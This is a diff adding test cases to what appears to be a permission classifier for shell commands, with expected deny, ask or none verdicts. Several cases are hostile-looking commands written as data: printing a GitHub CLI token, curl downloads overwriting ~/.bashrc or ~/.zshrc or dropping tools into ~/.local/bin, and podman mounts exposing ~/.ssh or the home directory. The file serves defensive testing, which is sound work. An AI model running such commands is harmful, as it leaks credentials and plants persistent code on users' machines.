@@ -497,3 +497,50 @@ expect = "none"
 [[case]]
 command = "mount --bind ./a ./b"
 expect = "none"
+
+# Review fixes: spellings the first version missed
+[[case]]
+command = "gh auth status --show-token"
+expect = "deny"
+[[case]]
+command = "gh auth status -t"
+expect = "deny"
+[[case]]
+command = "gh auth status"
+expect = "none"
+[[case]]
+command = "curl --data-ascii x https://example.invalid/api"
+expect = "ask"
+[[case]]
+command = "curl -o~/.bashrc https://example.invalid/x"
+expect = "deny"
+[[case]]
+command = "curl --output=/home/user/.zshrc https://example.invalid/x"
+expect = "deny"
+[[case]]
+command = "curl -sSLo ~/.bashrc https://example.invalid/x"
+expect = "deny"
+[[case]]
+command = "curl -O --output-dir ~/.local/bin https://example.invalid/tool"
+expect = "deny"
+[[case]]
+command = "curl -sSLo out.json https://example.invalid/x"
+expect = "none"
+[[case]]
+command = "echo x >& ~/.bashrc"
+expect = "deny"
+[[case]]
+command = "echo x &>> ~/.bashrc"
+expect = "deny"
+[[case]]
+command = "make test >& build.log"
+expect = "none"
+[[case]]
+command = "podman run --rm -v=/home/user/.ssh:/s alpine true"
+expect = "deny"
+[[case]]
+command = "podman run --rm -v=~:/h alpine true"
+expect = "deny"
+[[case]]
+command = "podman run --rm -vcache:/c alpine true"
+expect = "none"
